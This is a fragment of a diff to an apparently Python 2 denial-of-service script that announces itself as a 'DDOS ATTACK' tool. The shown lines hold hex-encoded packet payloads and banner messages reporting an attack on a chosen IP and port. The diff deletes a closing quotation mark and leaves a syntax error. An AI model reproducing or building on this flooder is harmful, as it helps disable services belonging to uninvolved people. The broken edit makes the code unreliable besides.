@@ -12,6 +12,6 @@ Pacotes = [
  codecs.decode('081e4dda', 'hex_codec'),
  codecs.decode('081efd40', 'hex_codec'),
  codecs.decode('081e7eda', 'hex_codec')]
-print ' TOLS DDOS ATTACK BY FUNKY'
+print ' TOLS DDOS ATTACK BY FUNKY
 print ' attack By Funky to ip %s port %s                                                               ' % (orgip, port)
 print ' Easy Down'
